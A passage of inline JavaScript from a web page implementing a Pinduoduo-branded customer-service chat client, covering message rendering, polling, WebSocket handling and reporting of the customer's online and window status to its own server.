                        ${this.escapeHtml(cardData.buttonText)}
                    </a>
                </div>
            `;
        }
        
        html += `
            </div>
        `;
        
        return html;
    }
    
    appendMessages(messages) {
        const container = $('#chat-container');
        
        messages.forEach(message => {
            // 去重检查
            if (message.id && $(`[data-message-id="${message.id}"]`).length > 0) {
                return;
            }
            
            let messageHtml = '';
            
            if (message.speaker_type === 1) { // 用户消息
                if (message.message_type === 'image' && (message.image_url || message.image_path)) {
                    const imageUrl = message.image_url || (message.image_path ? '/uploads/' + message.image_path : '');
                    messageHtml = `
                        <div class="user-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                            <div class="message-bubble user-bubble">
                                <img class="message-image" src="${imageUrl}" alt="图片" onerror="this.style.display='none'; this.parentNode.innerHTML='<p>[图片加载失败]</p>';">
                            </div>
                        </div>
                    `;
                } else {
                    // 检测是否为卡片消息
                    const cardInfo = this.isCardMessage(message.content);
                    if (cardInfo) {
                        const cardHtml = this.generateCardHtml(cardInfo.data);
                        messageHtml = `
                            <div class="user-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                                <div class="message-bubble user-bubble">
                                    ${cardHtml}
                                </div>
                            </div>
                        `;
                    } else {
                        messageHtml = `
                            <div class="user-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                                <div class="message-bubble user-bubble">
                                    <p class="message-text">${this.escapeHtml(message.content)}</p>
                                </div>
                            </div>
                        `;
                    }
                }
            } else { // 客服消息
                if (message.message_type === 'image' && (message.image_url || message.image_path)) {
                    const imageUrl = message.image_url || (message.image_path ? '/uploads/' + message.image_path : '');
                    messageHtml = `
                        <div class="agent-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                            <img class="agent-avatar" src="/assets/img/pdd.png" alt="客服头像">
                            <div class="special-message" style="max-width:80%;">
                                <img class="message-image" src="${imageUrl}" alt="图片" onerror="this.style.display='none'; this.parentNode.innerHTML='<p>[图片加载失败]</p>';">
                            </div>
                        </div>
                    `;
                } else {
                    // 检测是否为卡片消息
                    const cardInfo = this.isCardMessage(message.content);
                    if (cardInfo) {
                        const cardHtml = this.generateCardHtml(cardInfo.data);
                        messageHtml = `
                            <div class="agent-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                                <img class="agent-avatar" src="/assets/img/pdd.png" alt="客服头像">
                                <div class="special-message" style="max-width:80%;">
                                    ${cardHtml}
                                </div>
                            </div>
                        `;
                    } else {
                        messageHtml = `
                            <div class="agent-message" data-message-id="${message.id || 'temp_' + Date.now()}">
                                <img class="agent-avatar" src="/assets/img/pdd.png" alt="客服头像">
                                <div class="special-message" style="max-width:80%;">
                                    <p>${this.escapeHtml(message.content)}</p>
                                </div>
                            </div>
                        `;
                    }
                }
            }
            
            container.append(messageHtml);
        });
    }
    
    escapeHtml(unsafe) {
        if (!unsafe) return '';
        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }
    
    loadInitialMessages() {
        const self = this;
        
        $.get(`${this.apiBaseUrl}?action=get_messages&session_id=${encodeURIComponent(this.sessionId)}`)
            .done(function(data) {
                console.log('加载消息响应:', data);
                if (data.success && data.messages && data.messages.length > 0) {
                    // 过滤掉页面上已有的消息
                    const existingIds = $('[data-message-id]').map(function() {
                        return $(this).attr('data-message-id');
                    }).get();
                    
                    const newMessages = data.messages.filter(msg => !existingIds.includes(msg.id.toString()));
                    
                    if (newMessages.length > 0) {
                        self.appendMessages(newMessages);
                        const ids = newMessages.map(msg => msg.id).filter(id => id);
                        if (ids.length > 0) {
                            self.lastMessageId = Math.max(...ids);
                        }
                        self.scrollToBottom();
                    }
                }
                setTimeout(() => {
                    self.hideLoading();
                }, 1000);
            })
            .fail(function(error) {
                console.error('加载历史消息失败:', error);
                setTimeout(() => {
                    self.hideLoading();
                }, 1000);
            });
    }
    
    // 页面卸载事件增强
    setupPageUnload() {
        const self = this;

        window.addEventListener('beforeunload', function(event) {
            self.setCustomerOffline();
        });

        window.addEventListener('pagehide', function(event) {
            self.setCustomerOffline();
        });
    }
    
    // 页面可见性监听
    setupPageVisibilityListener() {
        const self = this;

        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                self.pageVisible = false;
                self.sendImmediateStatus('hidden');
            } else {
                self.pageVisible = true;
                self.lastActivityTime = Date.now();
                self.sendImmediateStatus('online');
            }
        });

        window.addEventListener('focus', function() {
            if (!self.pageVisible) {
                self.pageVisible = true;
                self.sendImmediateStatus('online');
            }
        });

        window.addEventListener('blur', function() {
            if (self.pageVisible) {
                self.pageVisible = false;
                self.sendImmediateStatus('hidden');
            }
        });

        window.addEventListener('beforeunload', function() {
            self.sendOfflineStatus();
        });

        window.addEventListener('pagehide', function() {
            self.sendOfflineStatus();
        });
    }
    
    // 立即发送状态
    sendImmediateStatus(status) {
        const requestData = {
            username: this.customerName,
            user_type: 'customer',
            is_online: status === 'online',
            window_status: this.getWindowStatusValue(status)
        };

        const blob = new Blob([JSON.stringify(requestData)], {type: 'application/json'});
        if (navigator.sendBeacon) {
            navigator.sendBeacon(this.apiBaseUrl, blob);
        } else {
            fetch(this.apiBaseUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(requestData),
                keepalive: true
            }).catch(() => {});
        }
    }
    
    // 发送离线状态
    sendOfflineStatus() {
        const requestData = {
            username: this.customerName,
            user_type: 'customer',
            is_online: false,
            window_status: 'window_closed'
        };

        const blob = new Blob([JSON.stringify(requestData)], {type: 'application/json'});

        if (navigator.sendBeacon) {
            navigator.sendBeacon(this.apiBaseUrl, blob);
        } else {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', this.apiBaseUrl, false);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(requestData));
            } catch (e) {
                // 忽略错误
            }
        }
    }
    
    // 获取窗口状态值
    getWindowStatusValue(status) {
        switch(status) {
            case 'online':
                return 'window_visible';
            case 'hidden':
            case 'away':
                return 'window_hidden';
            case 'offline':
            default:
                return 'window_closed';
        }
    }
    
    // 确保状态一致性
    ensureStatusConsistency(requestData) {
        const windowStatus = requestData.window_status;
        const isOnline = requestData.is_online;

        if (windowStatus === 'window_visible' && !isOnline) {
            requestData.is_online = true;
        }

        if (windowStatus === 'window_closed' && this.pageVisible) {
            requestData.window_status = 'window_visible';
            requestData.is_online = true;
        }
    }
    
    startPolling() {
        const self = this;
        
        this.pollingInterval = setInterval(function() {
            self.checkNewMessages();
        }, 2000);
    }
    
    checkNewMessages() {
        const self = this;
        
        $.get(`${this.apiBaseUrl}?action=poll_messages&session_id=${encodeURIComponent(this.sessionId)}&last_id=${this.lastMessageId}`)
            .done(function(data) {
                if (data.success && data.messages && data.messages.length > 0) {
                    // 过滤掉自己刚发送的消息（去重）
                    const now = Date.now();
                    const filteredMessages = data.messages.filter(msg => {
                        if (msg.speaker_type === 1) {
                            const isRecentlySent = self._lastSentMessages.some(sent => {
                                if (sent.messageType === 'image' && msg.message_type === 'image') {
                                    return (now - sent.timestamp) < 5000;
                                }
                                if (sent.content === msg.content && (now - sent.timestamp) < 5000) {
                                    return true;
                                }
                                return false;
                            });
                            if (isRecentlySent) {
                                console.log('跳过重复消息(自己发送):', msg.id, msg.content);
                                return false;
                            }
                        }
                        return true;
                    });

                    // 清理过期的去重记录
                    self._lastSentMessages = self._lastSentMessages.filter(sent =>
                        (now - sent.timestamp) < 10000
                    );

                    const newMessages = filteredMessages.filter(msg => {
                        // 去重检查
                        if ($(`[data-message-id="${msg.id}"]`).length > 0) {
                            return false;
                        }

                        return true;
                    });
                    
                    if (newMessages.length > 0) {
                        self.appendMessages(newMessages);
                        const allMessageIds = newMessages.map(msg => msg.id).filter(id => id);
                        if (allMessageIds.length > 0) {
                            self.lastMessageId = Math.max(...allMessageIds);
                        }
                        self.scrollToBottom();
                        
                        // 播放提示音
                        const hasBotMessage = newMessages.some(msg => msg.speaker_type === 2);
                        if (hasBotMessage) {
                            self.playNotificationSound();
                        }
                    }
                }
            })
            .fail(function(error) {
                console.log('轮询错误:', error);
            });
    }
    
    scrollToBottom() {
        const container = $('#chat-container');
        container.scrollTop(container[0].scrollHeight);
    }
    
    playNotificationSound() {
        try {
            const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ');
            audio.volume = 0.3;
            audio.play().catch(() => {});
        } catch (e) {
            console.log('播放提示音失败:', e);
        }
    }
    
    startStatusPolling() {
        const self = this;
        
        // 初始状态更新
        this.updateOnlineStatus();
        
        // 定时更新状态
        this.statusPollingInterval = setInterval(function() {
            self.updateOnlineStatus();
        }, 10000);
    }
    
    updateOnlineStatus() {
        const requestData = {
            action: 'update_online_status',
            username: this.customerName,
            user_type: 'customer',
            is_online: this.pageVisible,
            window_status: this.pageVisible ? 'window_visible' : 'window_hidden',
            device_type: this.deviceInfo.type,
            browser: this.deviceInfo.browser,
            os: this.deviceInfo.os,
            session_id: this.sessionId
        };
        
        $.ajax({
            url: this.apiBaseUrl,
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(requestData),
            success: function(data) {
                console.log('状态更新成功:', data);
            },
            error: function(error) {
                console.error('状态更新失败:', error);
            }
        });
    }
    
    setCustomerOffline() {
        const data = {
            action: 'update_online_status',
            username: this.customerName,
            user_type: 'customer',
            is_online: false,
            window_status: 'window_closed',
            session_id: this.sessionId
        };
        
        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
        if (navigator.sendBeacon) {
            navigator.sendBeacon(this.apiBaseUrl, blob);
        } else {
            $.ajax({
                url: this.apiBaseUrl,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(data),
                async: false,
                timeout: 1000
            });
        }
    }
    
    // ==================== WebSocket 相关方法 ====================

    /**
     * 初始化 WebSocket
     */
    initWebSocket() {
        console.log('客户端初始化 WebSocket...');

        if (this.ws && (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING)) {
            console.log('客户端 WebSocket 已连接或正在连接');
            return;
        }

        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}/wss`;

        console.log('连接 WebSocket:', wsUrl);

        try {
            this.ws = new WebSocket(wsUrl);
            this.wsConnectionStatus = 'connecting';
            this.updateConnectionStatus();
            
            this.ws.onopen = (event) => {
                this.handleWebSocketOpen(event);
            };
            
            this.ws.onmessage = (event) => {
                this.handleWebSocketMessage(event);
            };
            
            this.ws.onerror = (event) => {
                this.handleWebSocketError(event);
            };
            
            this.ws.onclose = (event) => {
                this.handleWebSocketClose(event);
            };
            
        } catch (error) {
            console.error('创建 WebSocket 连接失败:', error);
            this.wsConnectionStatus = 'error';
            this.updateConnectionStatus();
            this.scheduleWebSocketReconnect();
        }
    }

    /**
     * 处理 WebSocket 连接打开
     */
    handleWebSocketOpen(event) {
        console.log('客户端 WebSocket 连接已打开，准备身份验证');

        this.wsConnected = true;
        this.wsConnectionStatus = 'connected';
        this.wsReconnectAttempts = 0;
        this.updateConnectionStatus();

        setTimeout(() => {
            this.sendWebSocketAuth();
        }, 100);

        this.startWebSocketHeartbeat();

        setTimeout(() => {
            this.flushWebSocketMessageQueue();
        }, 200);

        this.updateCustomerOnlineStatus();
    }

    /**
     * 发送 WebSocket 身份验证
     */
    sendWebSocketAuth() {
        if (!this.wsConnected || this.ws.readyState !== WebSocket.OPEN) {
            console.warn('客户端 WebSocket 未连接，无法发送身份验证');
            return;
        }

        const authData = {
            type: 'auth',
            user_type: 'customer',
            user_id: this.customerName,
            session_key: this.sessionId
        };

        this.ws.send(JSON.stringify(authData));
        console.log('客户端发送 WebSocket 身份验证:', authData);
        this.wsAuthSent = true;
    }

    /**
     * 处理 WebSocket 消息
     */
    handleWebSocketMessage(event) {
        try {
            const data = JSON.parse(event.data);
            console.log('客户端收到 WebSocket 消息类型:', data.type, '数据:', data);
            
            switch (data.type) {
                case 'auth_success':
                    console.log('客户端 WebSocket 身份验证成功');
                    break;
                    
                case 'auth_error':
                    console.error('客户端 WebSocket 身份验证失败:', data.message);
                    break;
                    
                case 'send_message':
                case 'new_message':
                    this.handleRealTimeMessage(data);
                    break;
                    
                case 'message_sent':
                    this.handleMessageSentReceipt(data);
                    break;
                    
                case 'pong':
                    console.log('客户端 WebSocket 心跳响应');
                    break;
                    
                case 'error':
                    console.error('客户端 WebSocket 服务器错误:', data.message);
                    break;
            }
            
        } catch (error) {
            console.error('客户端解析 WebSocket 消息失败:', error, '原始数据:', event.data);
        }
    }

    /**
     * 处理实时消息
     */
    handleRealTimeMessage(data) {
        console.log('handleRealTimeMessage 收到数据:', data);

        if (data.session_key === this.sessionId) {
            console.log('客户端收到实时消息，speaker_type:', data.speaker_type, 'content:', data.content);

            if (data.message_id && data.message_id <= this.lastMessageId) {
                console.log('消息ID过小,跳过:', data.message_id, '<=', this.lastMessageId);
                return;
            }

            if (data.message_id && $(`[data-message-id="${data.message_id}"]`).length > 0) {
                console.log('消息已存在于DOM中,跳过:', data.message_id);
                return;
            }

            if (data.message_id && this.recentlySentMessageIds.has(data.message_id)) {
                console.log('是自己发送的消息，WebSocket 回声已跳过:', data.message_id);
                return;
            }

            // 先检查是否是自己刚发送的消息（去重）
            if (data.speaker_type === 1) {
                const now = Date.now();
                const isRecentlySent = this._lastSentMessages.some(sent => {
                    if (sent.messageType === 'image' && data.message_type === 'image') {
                        return (now - sent.timestamp) < 5000;
                    }
                    if (sent.content === data.content && (now - sent.timestamp) < 5000) {
                        return true;
                    }
                    return false;
                });
                if (isRecentlySent) {
                    console.log('跳过WebSocket重复消息(自己发送):', data.message_id, data.content);
                    if (data.message_id) {
                        this.lastMessageId = Math.max(this.lastMessageId, data.message_id);
                    }
                    return;
                }
            }

            const message = {
                id: data.message_id || 'ws_' + Date.now(),
                content: data.content,
                speaker_type: data.speaker_type || 2,
                created_at: data.created_at || new Date().toISOString(),
                customer_name: data.customer_name || this.customerName,
                agent_account: data.agent_account || this.agentAccount,
                message_type: data.message_type || 'text',
                image_url: data.image_url,
                image_path: data.image_path
            };

            this.appendMessages([message]);

            this.scrollToBottom();

            this.playNotificationSound();

            if (data.message_id) {
                this.recentlyReceivedWsMessageIds.add(data.message_id);
                setTimeout(() => {
                    this.recentlyReceivedWsMessageIds.delete(data.message_id);
                }, 10000);
            }

            if (data.message_id && data.message_id > this.lastMessageId) {
                this.lastMessageId = data.message_id;
            }
        }
    }

    /**
     * 处理消息发送回执
     */
    handleMessageSentReceipt(data) {
        console.log('客户端消息发送回执:', data);
    }

    /**
     * 处理 WebSocket 错误
     */
    handleWebSocketError(event) {
        console.error('客户端 WebSocket 错误:', event);
        this.wsConnectionStatus = 'error';
        this.updateConnectionStatus();
    }

    /**
     * 处理 WebSocket 关闭
     */
    handleWebSocketClose(event) {
        console.log('客户端 WebSocket 连接关闭:', event.code, event.reason);
        this.wsConnected = false;
        this.wsConnectionStatus = 'disconnected';
        this.wsAuthSent = false;
        this.updateConnectionStatus();

        this.stopWebSocketHeartbeat();

        this.scheduleWebSocketReconnect();
    }

    /**
     * 发送 WebSocket 心跳
     */
    startWebSocketHeartbeat() {
        this.stopWebSocketHeartbeat();

        this.wsHeartbeatInterval = setInterval(() => {
            if (this.wsConnected && this.ws.readyState === WebSocket.OPEN) {
                const heartbeat = {
                    type: 'ping',
                    timestamp: Date.now()
                };
                this.ws.send(JSON.stringify(heartbeat));
            }
        }, 30000);
    }

    /**
     * 停止 WebSocket 心跳
     */
    stopWebSocketHeartbeat() {
        if (this.wsHeartbeatInterval) {
            clearInterval(this.wsHeartbeatInterval);
            this.wsHeartbeatInterval = null;
        }
    }

    /**
     * 安排 WebSocket 重连
     */
    scheduleWebSocketReconnect() {
        if (this.wsReconnectAttempts >= this.maxWsReconnectAttempts) {
            console.log('客户端已达到最大重连次数，停止重连');
            return;
        }

        this.wsReconnectAttempts++;
        const delay = this.wsReconnectDelay * Math.pow(1.5, this.wsReconnectAttempts - 1);

        console.log(`客户端将在 ${delay}ms 后尝试第 ${this.wsReconnectAttempts} 次重连`);

        setTimeout(() => {
            this.initWebSocket();
        }, delay);
    }

    /**
     * 发送消息到 WebSocket
     */
    sendMessageToWebSocket(messageData) {
        if (!this.wsConnected || this.ws.readyState !== WebSocket.OPEN) {
            console.log('客户端 WebSocket 未连接，将消息加入队列');
            this.wsMessageQueue.push(messageData);
            return false;
        }

        try {
            this.ws.send(JSON.stringify(messageData));
            console.log('客户端通过 WebSocket 发送消息:', messageData);
            return true;
        } catch (error) {
            console.error('客户端 WebSocket 发送消息失败:', error);
            this.wsMessageQueue.push(messageData);
            return false;
        }
    }

    /**
     * 刷新 WebSocket 消息队列
     */
    flushWebSocketMessageQueue() {
        if (this.wsMessageQueue.length === 0) return;

        console.log(`客户端刷新消息队列，有 ${this.wsMessageQueue.length} 条待发送消息`);

        const queue = [...this.wsMessageQueue];
        this.wsMessageQueue = [];

        queue.forEach(messageData => {
            this.sendMessageToWebSocket(messageData);
        });
    }

    /**
     * 更新连接状态显示
     */
    updateConnectionStatus() {
        const statusMap = {
            'connected': { text: '在线', color: '#52c41a' },
            'connecting': { text: '连接中...', color: '#faad14' },
            'disconnected': { text: '离线', color: '#ff4d4f' },
            'error': { text: '连接错误', color: '#ff4d4f' }
        };

        const status = statusMap[this.wsConnectionStatus] || { text: '未知', color: '#999' };
        console.log('客户端连接状态:', status.text);
    }

    // ==================== WebSocket 方法结束 ====================
    
    updateCustomerOnlineStatus() {
        const self = this;
        
        $.ajax({
            url: this.apiBaseUrl,
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({
                action: 'update_online_status',
                username: this.customerName,
                user_type: 'customer',
                is_online: true
            }),
            success: function(data) {
                console.log('客户在线状态更新成功:', data);
                self.isOnline = true;
            },
            error: function(xhr, status, error) {
                console.error('更新客户在线状态失败:', error);
                self.isOnline = false;
            }
        });
    }
    
    destroy() {
        if (this.pollingInterval) {
            clearInterval(this.pollingInterval);
        }
        
        if (this.statusPollingInterval) {
            clearInterval(this.statusPollingInterval);
        }
        
        this.stopWebSocketHeartbeat();
        
        if (this.ws) {
            this.ws.close(1000, '页面关闭');
        }
        
        this.setCustomerOffline();
        console.log('拼多多聊天系统已销毁');
    }
}

// 初始化聊天系统
$(document).ready(function() {
    console.log('文档加载完成，初始化拼多多聊天系统...');
    window.chatSystem = new PDDChatSystem();
    
    // 页面加载完成后隐藏加载动画
    setTimeout(function() {
        var loadingContainer = document.getElementById('loadingContainer');
        var appWrapper = document.getElementById('app-wrapper');
        
        if (loadingContainer) {
            loadingContainer.classList.add('hidden');
            setTimeout(function() {
                loadingContainer.remove();
            }, 300);
        }
        
        if (appWrapper) {
            appWrapper.classList.add('loaded');
        }
    }, 500);
    
    $(window).on('beforeunload', function() {
        if (window.chatSystem) {
            window.chatSystem.destroy();
        }
    });
});
</script>

</body></html>